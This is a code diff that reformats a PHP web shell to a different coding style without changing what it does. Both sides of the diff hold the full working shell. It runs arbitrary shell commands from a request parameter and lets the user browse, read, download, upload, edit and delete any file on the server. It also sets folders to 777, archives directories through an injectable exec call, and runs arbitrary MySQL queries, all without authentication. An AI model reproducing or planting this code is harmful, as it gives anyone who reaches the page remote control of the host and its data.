@@ -4,7 +4,7 @@
 
 function isLinux($path)
 {
-    return (substr($path,0,1)=="/" ? true : false);
+    return (substr($path, 0, 1)=="/" ? true : false);
 }
 function getSlashDir($isLinux)
 {
@@ -13,109 +13,87 @@ function getSlashDir($isLinux)
 //See if we are on Linux or Windows becuase the paths have to be processed differently
 $cwd=getcwd();
 $isLinux=isLinux($cwd);
-if(!$isLinux)
-{
-    $driveLetter=substr($cwd,0,1);
+if (!$isLinux) {
+    $driveLetter=substr($cwd, 0, 1);
 }
 $slash=getSlashDir($isLinux);
-$parts=explode($slash,$cwd);
+$parts=explode($slash, $cwd);
 $rootDir=($isLinux ? $slash : ($driveLetter . ':' . $slash));
 
-function cleanPath($path,$isLinux)
+function cleanPath($path, $isLinux)
 {
     $slash=getSlashDir($isLinux);
-    $parts=explode($slash,$path);
-    foreach($parts as $key=>$val)//Process .. directories and a single .
-    {
-        if($val=="..")
-        {
+    $parts=explode($slash, $path);
+    foreach ($parts as $key=>$val) {//Process .. directories and a single .
+        if ($val=="..") {
             $parts[$key]="";
             $lastKey=$key-1;
             $parts[$lastKey]="";
-        }
-        elseif($val==".")
-        {
+        } elseif ($val==".") {
             $parts[$key]="";
         }
     }
     reset($parts);
     $fixedPath=($isLinux ? "/" : "");//Some PHP configs wont automatically create a variable on .= or will at least whine about it
     $firstPiece=true;
-    foreach($parts as $val)//Assemble the path back together
-    {
-        if($val != "")
-        {
+    foreach ($parts as $val) {//Assemble the path back together
+        if ($val != "") {
             $fixedPath .=  ($firstPiece ? '' : $slash) . $val;
             $firstPiece=false;
         }
     }
-    if($fixedPath=="")//If we took out the entire path go to bottom level to avoid an error
-    {
+    if ($fixedPath=="") {//If we took out the entire path go to bottom level to avoid an error
         $fixedPath=($isLinux ? $slash : ($driveLetter . ":" . $slash));
     }
     
     //Make sure there is an ending slash
-    if(substr($fixedPath,-1)!=$slash)
+    if (substr($fixedPath, -1)!=$slash) {
         $fixedPath .= $slash;
+    }
     return $fixedPath;
 }
-if(isset($_REQUEST['chm']))
-{
-    if(!$isLinux)
-    {
+if (isset($_REQUEST['chm'])) {
+    if (!$isLinux) {
         echo "This feature only works on Linux";
+    } else {
+        echo(@chmod($_REQUEST['chm'], 0777) ? "Reassigned" : "Can't Reasign");
     }
-    else
-    {
-        echo (@chmod ( $_REQUEST['chm'] , 0777 ) ? "Reassigned" : "Can't Reasign");
-    }
-}
-elseif(isset($_REQUEST['phpinfo']))
-{
+} elseif (isset($_REQUEST['phpinfo'])) {
     phpinfo();
-}
-elseif(isset($_REQUEST['dl']))
-{
-    if(@fopen($_REQUEST['dl'] .  $_REQUEST['file'],'r')==true)
-    {
+} elseif (isset($_REQUEST['dl'])) {
+    if (@fopen($_REQUEST['dl'] .  $_REQUEST['file'], 'r')==true) {
         $_REQUEST['dl'] .= $_REQUEST['file'];
-        if(substr($_REQUEST['dl'],0,1)==$slash)
-            $fileArr=explode($slash,$_REQUEST['dl']);
+        if (substr($_REQUEST['dl'], 0, 1)==$slash) {
+            $fileArr=explode($slash, $_REQUEST['dl']);
+        }
         
         header('Content-disposition: attachment; filename=' . $_REQUEST['file']);
         header('Content-type: application/octet-stream');
         readfile($_REQUEST['dl']);
-    }
-    else
-    {
+    } else {
         echo $_REQUEST['dl'];
     }
-}
-elseif(isset($_REQUEST["gz"]))
-{
-    if(!$isLinux)
-    {
+} elseif (isset($_REQUEST["gz"])) {
+    if (!$isLinux) {
         echo "This feature only works on Linux";
-    }
-    else
-    {
+    } else {
         $directory=$_REQUEST["gz"];
         
-        if(substr($directory,-1)=="/")
-            $directory = substr($directory,0,-1); 
+        if (substr($directory, -1)=="/") {
+            $directory = substr($directory, 0, -1);
+        }
                 
-        $dirParts=explode($slash,$directory);
+        $dirParts=explode($slash, $directory);
         $fname=$dirParts[(sizeof($dirParts)-1)];
         
         $archive = time();
         
-        exec( "cd $directory; tar czf $archive *");
+        exec("cd $directory; tar czf $archive *");
         $output=@file_get_contents($directory . "/" . $archive);
         
-        if(!$output)
+        if (!$output) {
             header("Content-disposition: attachment; filename=ACCESS_PROBLEM");
-        else
-        {
+        } else {
             header("Content-disposition: attachment; filename=$fname.tgz");
             echo $output;
         }
@@ -123,53 +101,39 @@ elseif(isset($_REQUEST["gz"]))
         header('Content-type: application/octet-stream');
         @unlink($directory . "/" . $archive);
     }
-}
-elseif(isset($_REQUEST['f']))
-{
+} elseif (isset($_REQUEST['f'])) {
     $filename=$_REQUEST['f'];
-    $file=fopen("$filename","rb");
-        header("Content-Type: text/plain");
+    $file=fopen("$filename", "rb");
+    header("Content-Type: text/plain");
     fpassthru($file);
-}
-elseif(isset($_REQUEST['d']))
-{
+} elseif (isset($_REQUEST['d'])) {
     $d=$_REQUEST['d'];
     echo "<pre>";
-    if ($handle = opendir("$d")) 
-    {
+    if ($handle = opendir("$d")) {
         echo "<h2>listing of ";
         $conString="";
-        if($isLinux)
+        if ($isLinux) {
             echo "<a href='?d=$slash'>$slash</a>";
-        foreach(explode($slash,cleanPath($d,$isLinux)) as $val)
-        {
+        }
+        foreach (explode($slash, cleanPath($d, $isLinux)) as $val) {
             $conString .= $val . $slash;
             echo "<a href='?d=$conString'>" . $val . "</a>" . ($val != "" ? $slash : '');
         }
-        echo " (<a target='_blank' href='?uploadForm=1&dir=" . urlencode(cleanPath($d,$isLinux)) . "'>upload file</a>) (<a href='?d=" . urlencode(cleanPath($d,$isLinux)) . "&hldb=1'>DB interaction files in red</a>)</h2> (<a target='_blank' href='?gz=" . urlencode(cleanPath($d,$isLinux)) . "'>gzip & download folder</a>) (<a target='_blank' href='?chm=" . urlencode(cleanPath($d,$isLinux)) . "'>chmod folder to 777)</a> (these rarely work)<br />";
-        while ($dir = readdir($handle))
-        { 
-            if (is_dir("$d$slash$dir")) 
-            {
-                if($dir != "." && $dir !="..")
+        echo " (<a target='_blank' href='?uploadForm=1&dir=" . urlencode(cleanPath($d, $isLinux)) . "'>upload file</a>) (<a href='?d=" . urlencode(cleanPath($d, $isLinux)) . "&hldb=1'>DB interaction files in red</a>)</h2> (<a target='_blank' href='?gz=" . urlencode(cleanPath($d, $isLinux)) . "'>gzip & download folder</a>) (<a target='_blank' href='?chm=" . urlencode(cleanPath($d, $isLinux)) . "'>chmod folder to 777)</a> (these rarely work)<br />";
+        while ($dir = readdir($handle)) {
+            if (is_dir("$d$slash$dir")) {
+                if ($dir != "." && $dir !="..") {
                     $dirList[]=$dir;
-            }
-            else
-            {
-                if(isset($_REQUEST["hldb"]))
-                {
+                }
+            } else {
+                if (isset($_REQUEST["hldb"])) {
                     $contents=file_get_contents("$d$slash$dir");
-                    if (stripos($contents, "mysql_") || stripos($contents, "mysqli_") || stripos($contents, "SELECT "))
-                    {
+                    if (stripos($contents, "mysql_") || stripos($contents, "mysqli_") || stripos($contents, "SELECT ")) {
                         $fileList[]=array('dir'=>$dir,'color'=>'red');
-                    }
-                    else
-                    {
+                    } else {
                         $fileList[]=array('dir'=>$dir,'color'=>'black');
                     }
-                }
-                else
-                {
+                } else {
                     $fileList[]=array('dir'=>$dir,'color'=>'black');
                 }
             }
@@ -179,69 +143,58 @@ elseif(isset($_REQUEST['d']))
         echo "<a href='?d=$d$slash..'><font color=grey>..\n</font></a>";
         
         //Some configurations throw a notice if is_array is tried with a non-existant variable
-        if(isset($dirList))
-        if(is_array($dirList))
-        foreach($dirList as $dir)
-        {
-                echo "<a href='?d=$d$slash$dir'><font color=grey>$dir\n</font></a>";
+        if (isset($dirList)) {
+            if (is_array($dirList)) {
+                foreach ($dirList as $dir) {
+                    echo "<a href='?d=$d$slash$dir'><font color=grey>$dir\n</font></a>";
+                }
+            }
         }
         
-        if(isset($fileList))
-        if(is_array($fileList))
-        foreach($fileList as $dir)
-        {
-            echo "<a href='?f=$d" . $slash . $dir['dir'] . "'><font color=" . $dir['color'] . ">" . $dir['dir'] . "</font></a>" . 
-                 "|<a href='?dl=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Download</a>|" . 
-                 "|<a href='?ef=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Edit</a>|" . 
-                 "|<a href='?df=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Delete</a>| \n";
+        if (isset($fileList)) {
+            if (is_array($fileList)) {
+                foreach ($fileList as $dir) {
+                    echo "<a href='?f=$d" . $slash . $dir['dir'] . "'><font color=" . $dir['color'] . ">" . $dir['dir'] . "</font></a>" .
+                 "|<a href='?dl=" . cleanPath($d, $isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Download</a>|" .
+                 "|<a href='?ef=" . cleanPath($d, $isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Edit</a>|" .
+                 "|<a href='?df=" . cleanPath($d, $isLinux) . '&file=' .$dir["dir"] . "' target='_blank'>Delete</a>| \n";
+                }
+            }
         }
-    } 
-    else 
-    echo "opendir() failed";
+    } else {
+        echo "opendir() failed";
+    }
     closedir($handle);
-}
-elseif(isset($_REQUEST['c']))
-{
-    if( @ini_get('safe_mode') )
-    {
+} elseif (isset($_REQUEST['c'])) {
+    if (@ini_get('safe_mode')) {
         echo 'Safe mode is on, the command is by default run though escapeshellcmd() and can only run programms in safe_mod_exec_dir (' . @ini_get('safe_mode_exec_dir') . ') <br />';
     }
     echo "<b>Command: <I>" . $_REQUEST['c'] . "</I></b><br /><br />";
-    trim(exec($_REQUEST['c'],$return));
-    foreach($return as $val)
-    {
+    trim(exec($_REQUEST['c'], $return));
+    foreach ($return as $val) {
         echo '<pre>' . htmlentities($val) . '</pre>';
     }
-}
-elseif(isset($_REQUEST['uploadForm']) || isset($_FILES["file_name"]))
-{
-    if(isset($_FILES["file_name"]))
-    {
-        if ($_FILES["file_name"]["error"] > 0)
-        {
-                echo "Error";
-        }
-        else
-        {
+} elseif (isset($_REQUEST['uploadForm']) || isset($_FILES["file_name"])) {
+    if (isset($_FILES["file_name"])) {
+        if ($_FILES["file_name"]["error"] > 0) {
+            echo "Error";
+        } else {
             $target_path = $_COOKIE["uploadDir"];
-            if(substr($target_path,-1) != "/")
+            if (substr($target_path, -1) != "/") {
                 $target_path .= "/";
+            }
             
-            $target_path = $target_path . basename( $_FILES['file_name']['name']); 
+            $target_path = $target_path . basename($_FILES['file_name']['name']);
 
-            if(move_uploaded_file($_FILES['file_name']['tmp_name'], $target_path)) {
-                setcookie("uploadDir","");
-                echo "The file ".  basename( $_FILES['file_name']['name']). 
+            if (move_uploaded_file($_FILES['file_name']['tmp_name'], $target_path)) {
+                setcookie("uploadDir", "");
+                echo "The file ".  basename($_FILES['file_name']['name']).
                 " has been uploaded";
-            } 
-            else
-            {
+            } else {
                 echo "Error copying file, likely a permission error.";
             }
         }
-    }
-    else
-    {       
+    } else {
         ?>
         <form target="_blank" action="" method="GET">
             <input type="hidden" name="cc" value="1" />
@@ -256,14 +209,10 @@ elseif(isset($_REQUEST['uploadForm']) || isset($_FILES["file_name"]))
 
         <?php
     }
-}
-elseif(isset($_REQUEST['cc']))
-{
-    setcookie("uploadDir",$_GET["dir"]);
+} elseif (isset($_REQUEST['cc'])) {
+    setcookie("uploadDir", $_GET["dir"]);
     echo "You are OK to upload the file, don't upload files to other directories before completing this upload.";
-}
-elseif(isset($_REQUEST['mquery']))
-{
+} elseif (isset($_REQUEST['mquery'])) {
     $host=$_REQUEST['host'];
     $usr=$_REQUEST['usr'];
     $passwd=$_REQUEST['passwd'];
@@ -272,19 +221,15 @@ elseif(isset($_REQUEST['mquery']))
     @mysql_connect($host, $usr, $passwd) or die("Connection Error: " . mysql_error());
     mysql_select_db($db);
     $result = mysql_query($mquery);
-    if($result!=false)
-    {
+    if ($result!=false) {
         echo "<h2>The following query has sucessfully executed</h2>" . htmlentities($mquery) . "<br /><br />";
         echo "Return Results:<br />";
         $first=true;
         echo "<table border='1'>";
-        while ($row = mysql_fetch_array($result,MYSQL_ASSOC))
-        {
-            if($first)
-            {
+        while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
+            if ($first) {
                 echo "<tr>";
-                foreach($row as $key=>$val)
-                {
+                foreach ($row as $key=>$val) {
                     echo "<td><b>$key</b></td>";
                 }
                 echo "</tr>";
@@ -292,35 +237,25 @@ elseif(isset($_REQUEST['mquery']))
                 $first=false;
             }
             echo "<tr>";
-            foreach($row as $val)
-            {
+            foreach ($row as $val) {
                 echo "<td>$val</td>";
             }
             echo "</tr>";
         }
         echo "</table>";
         mysql_free_result($result);
-    }
-    else
-    {
+    } else {
         echo "Query Error: " . mysql_error();
     }
-}
-elseif(isset($_REQUEST['df']))
-{
+} elseif (isset($_REQUEST['df'])) {
     $_REQUEST['df'] .= $slash . $_REQUEST['file'];
-    if(@unlink($_REQUEST['df']))
-    {
-            echo "File deleted";
+    if (@unlink($_REQUEST['df'])) {
+        echo "File deleted";
+    } else {
+        echo "Error deleting file";
     }
-    else
-    {
-            echo "Error deleting file";
-    }
-}
-elseif(isset($_REQUEST['ef']))
-{
-?>
+} elseif (isset($_REQUEST['ef'])) {
+    ?>
 <script type="text/javascript">
   <!--
 
@@ -367,34 +302,27 @@ elseif(isset($_REQUEST['ef']))
   //--></script>
 
   <?php
-    $_REQUEST['ef'] .= $_REQUEST['file']; 
-    if(isset($_POST["newcontent"]))
-    {
+    $_REQUEST['ef'] .= $_REQUEST['file'];
+    if (isset($_POST["newcontent"])) {
         $_POST["newcontent"]=urldecode(base64_decode($_POST["newcontent"]));
-        $stream=@fopen($_REQUEST['ef'],"w");
+        $stream=@fopen($_REQUEST['ef'], "w");
         
-        if($stream)
-        {
-            fwrite($stream,$_POST["newcontent"]);
+        if ($stream) {
+            fwrite($stream, $_POST["newcontent"]);
             echo "Write sucessful";
-        }
-        else
-        {
+        } else {
             echo "Could not write to file";
         }
         fclose($stream);
-    }
-    ?>
+    } ?>
     <form action="" name="f" method="POST">
     <textarea wrap="off" rows="40" cols="130" name="newcontent"><?php echo file_get_contents($_REQUEST['ef']) ?></textarea><br />
     <input type="submit" value="I base64 encoded it myself, dont run script" /><br />
     <input type="submit" value="Change (requires javascript to work)"  onclick="document.f.newcontent.value=encode64(document.f.newcontent.value);" />
     </form>
     <?php
-}
-else
-{
-?>
+} else {
+    ?>
 <b>Server Information:</b><br />
 <i>
 Operating System: <?php echo PHP_OS ?><br />
@@ -422,8 +350,7 @@ PHP Version: <?php echo PHP_VERSION ?><br />
 </table>
 </form>
 <hr>
-<pre><form action="" METHOD="GET" >Execute Shell Command (safe mode is <?php echo (@ini_get('safe_mode') ? 'on' : 'off') ?>): <input type="text" name="c"><input type="submit" value="Go"></form> 
+<pre><form action="" METHOD="GET" >Execute Shell Command (safe mode is <?php echo(@ini_get('safe_mode') ? 'on' : 'off') ?>): <input type="text" name="c"><input type="submit" value="Go"></form> 
 <?php
 }
 //Intentionally left open to avoid output the file download function 1
-
